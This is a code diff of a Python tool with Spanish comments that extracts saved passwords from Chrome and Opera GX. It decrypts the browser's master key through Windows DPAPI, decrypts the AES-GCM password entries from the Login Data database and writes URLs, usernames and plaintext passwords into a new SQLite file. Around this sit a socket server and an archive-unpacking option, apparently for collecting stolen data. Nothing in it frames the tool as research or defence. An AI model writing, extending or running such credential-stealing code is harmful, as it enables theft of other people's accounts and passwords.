@@ -5,8 +5,10 @@ import base64
 import win32crypt
 import Sockets.sckt_server as server
 import shutil
+from Cryptodome.Cipher import AES
 
 #pip install pypiwin32
+#pip install pycryptodomex
 
 # Enviar de client a server , haciendo que en el serve se guarden en x sitio.
 
@@ -50,44 +52,83 @@ def run_server():
 def unpack():
     return shutil.unpack_archive("Data123963.zip", "Data/")
 
-def master_Key():
-    with open(PATH["CHROME_LOCAL_STATE_FILE_PATH"], "r") as f:
+"""
+*********************
+*Funciones Chrome y OperaGX
+*********************
+"""
+def ch_generate_cipher(aes_key,ini_vector):
+    return AES.new(aes_key,AES.MODE_GCM,ini_vector)
+
+def ch_decrypt_payload(cipher,payload):
+    return cipher.decrypt(payload)
+
+def ch_decrypt_pass(buffer,aes_key):
+    try:
+        ini_vector = buffer[3:15]
+        payload = buffer[15:]
+        cipher = ch_generate_cipher(aes_key,ini_vector)
+        psswd = ch_decrypt_payload(cipher,payload)
+        psswd = psswd[:-16].decode()
+
+        return psswd
+    except:
+        try:
+            psswd = win32crypt.CryptUnprotectData(buffer, None, None, None, 0)[1]
+            return psswd
+        except:
+            pass
+
+def ch_master_Key(nav):
+    if nav =="chrome":
+        path = PATH["CHROME_LOCAL_STATE_FILE_PATH"]
+    else:
+        path = PATH["OPERAGX_LOCAL_STATE_FILE_PATH"]
+
+    with open(path, "r") as f:
         local_state = f.read()
-        local_state_json = json.load(local_state)
+        local_state = json.loads(local_state)
     master_Key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     master_Key = master_Key[5:]
     master_Key = win32crypt.CryptUnprotectData(master_Key,None,None,None,0)[1]
 
     return master_Key
 
-def decrypt_pass():
-    pass
+def ch_pass(nav):
+    if nav =="chrome":
+        cnn = sqlite3.connect(PATH["CHROME_PASSWORDS_DB_PATH"])
+        cnn1 = sqlite3.connect("chrome_pass.db")
+    else:
+        cnn = sqlite3.connect(PATH["OPERAGX_PASSWORDS_DB_PATH"])
+        cnn1 = sqlite3.connect("operagx_pass.db")
 
-def pass_chrome():
-    #cnn = sqlite3.connect(os.getenv('localappdata')+ r'\\Google\\Chrome\\User Data\\Default\\Login Data')
-    cnn=sqlite3.connect(PATH["CHROME_PASSWORDS_DB_PATH"])
-    cnn1 = sqlite3.connect("chrome_pass.db")
     cursor = cnn.cursor()
     cursor1 = cnn1.cursor()
     try:
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
         cursor1.execute('''CREATE TABLE passwords(url, username, password)''')
-        print(master_Key())
-        """
         for i in cursor.fetchall():
-            print(master_Key())
-        """
+            decrypted_password = ch_decrypt_pass(i[2], ch_master_Key())
+            if decrypted_password:
+                cursor1.execute("INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (i[0], i[1], decrypted_password))
+                cnn1.commit()
+
     except Exception as e:
         pass
     finally:
         cursor.close()
         cnn.close()
+"""
+***************************
+*Funciones Chrome y OperaGX
+***************************
+"""
+
 
 def main():
-    options = {1: run_server,
-               2: unpack,
-               3: pass_chrome,
-               4: master_Key,
+    options = { 1: run_server,
+                2: unpack,
+                3: ch_pass,
         }
 
     while True:
@@ -96,10 +137,17 @@ def main():
         print("3. Decrypt Chrome Passwrds and Generate a DB")
         print("4. Decrypt Edge Passwrds and Generate a DB")
         print("5. Decrypt OperaGX Passwrds and Generate a DB")
+        print("8. Cerrar")
+
 
         x = int(input())
-        if x != 5:
-            options[x]()
+        if x != 8:
+            if x == 3:#Chrome
+                options[x]("chrome")
+            elif x == 5:#Opera
+                options[3]("Opera")
+            else:#Resto
+                options[x]()
         else:
             break
 
